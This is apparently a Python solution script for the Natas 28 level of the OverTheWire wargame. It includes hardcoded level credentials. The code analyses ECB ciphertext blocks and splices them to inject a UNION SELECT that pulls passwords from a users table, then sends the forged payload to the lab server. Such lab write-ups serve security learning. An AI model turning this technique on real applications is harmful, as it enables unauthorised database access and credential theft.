import requests
import re
import urllib.parse as urllib
import base64
import requests.utils as utl
import string 


# G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP KriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
# G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP JkxUm+itzIOY4rN1uAFz21QcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o=
# G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP Kuz+AZ4a6Y5sScuFgANzFumi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo=

username ="natas28"
password= "skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4"
url = "http://%s.natas.labs.overthewire.org"%username

session = requests.Session()
# response = session.get(url,auth=(username,password))
# print( repr(base64.b64decode(urllib.unquote(response.url[60:]))))
# print( urllib.unquote(response.url[60:]) )

block_size = 16
# checking query len and response len
def block_size_finder():
	for i in range(80):	
		response = session.post(url,data={"query" : "A" * i},auth=(username,password))
		res_len = len(base64.b64decode(urllib.unquote(response.url[60:])))
		print("query length :" , i , "; response length : " , res_len) 

		# response length vary for every 16 response


def block_analyze():
	for i in range(16):
		response = session.post(url,data={"query" : "A" * i},auth=(username,password))	
		res_len = len(base64.b64decode(urllib.unquote(response.url[60:])))
		print("query length :" , i , "; response length : " , res_len) 
		print("="*80)
		segment = 80 / block_size
		for block in range(int(segment)):
			print("Block",block,"data",repr(base64.b64decode(utl.unquote(response.url[60:]))[ block * block_size : (block+1) * block_size ]) )

	# btw query len 10 to 11 Block 2 is same
	# '\x9eb&\x86\xa5&@YW\x06\t\x9a\xbc\xb0R\xbb' from query length 9 because dif from this hex values , it crt string

def valid_string():
	# correct_string = b'\x9eb&\x86\xa5&@YW\x06\t\x9a\xbc\xb0R\xbb' # for 'a'
	correct_string = b'\x88\x16\xc6\x1e+\xc67&`\xf8y\xc4_#w~' # 'A' 
	print(correct_string)

	for char in string.printable:
		print("Trying with ch:",char)
		response = session.post(url,data={"query" : "A" * 9 + char},auth=(username,password))	
		block = 2 # block idx                                           # 2 x 16 = 32    :    # 3 * 16 =  48
		answer = repr(base64.b64decode(utl.unquote(response.url[60:]))[ block*block_size : (block+1)*block_size ] )
		print(answer)
		if answer == str(correct_string):
			print("WE FOUND CHARACTER ",char)
			print("=========================")
			# %

def query_maker():

	injection = "A" * 9 + "' UNION SELECT password FROM users; #"
	# injection = "A" * 9 + "' UNION SELECT @@version; #"

	blocks = ( len(injection) - 10 ) / block_size
	if ( len(injection)-10 % block_size != 0):
		blocks +=1
	blocks = int(blocks)
	print(blocks)

	response = session.post(url,data={"query" : injection },auth=(username,password))
	raw_inject = base64.b64decode(utl.unquote(response.url[60:]))
	response = session.post(url,data={"query" : "A" * 10},auth=(username,password))	
	good_base = base64.b64decode(utl.unquote(response.url[60:]))

	query = good_base[:block_size*3]  + raw_inject[ block_size*3: block_size*3 + (blocks * block_size)] + good_base[block_size*3:]

	url_payload =  utl.quote(base64.b64encode(query)).replace('/','%2F')
	print(url_payload)  
	# ^^^^^^^^^^
	# G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeWnPci%2FqKte0ohRTkObF%2BT5ujPcGtKfnu%2FmSL%2FsyLoz01sA1xi1%2BF7vPb%2FZHFEUMHc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D

URL_PAYLOAD_a = "G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeWnPci%2FqKte0ohRTkObF%2BT5ujPcGtKfnu%2FmSL%2FsyLoz01sA1xi1%2BF7vPb%2FZHFEUMHc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D"
URL_PAYLOAD_A = "G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyWnPci%2FqKte0ohRTkObF%2BT5ujPcGtKfnu%2FmSL%2FsyLoz01sA1xi1%2BF7vPb%2FZHFEUMHc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D"
VERSION_PAYLOAD  = "G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyPmWXqmnze9O%2Fn2%2BK8sqRse%2FPElxfpoPCpDu%2FmybKgH1zil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D"

def sql_injection():
	response = requests.get(url + "/search.php/?query=" + URL_PAYLOAD_A , auth=(username,password))
	content = response.text
	print(content)


# block_size_finder()
# block_analyze()
# valid_string()
query_maker()
sql_injection()








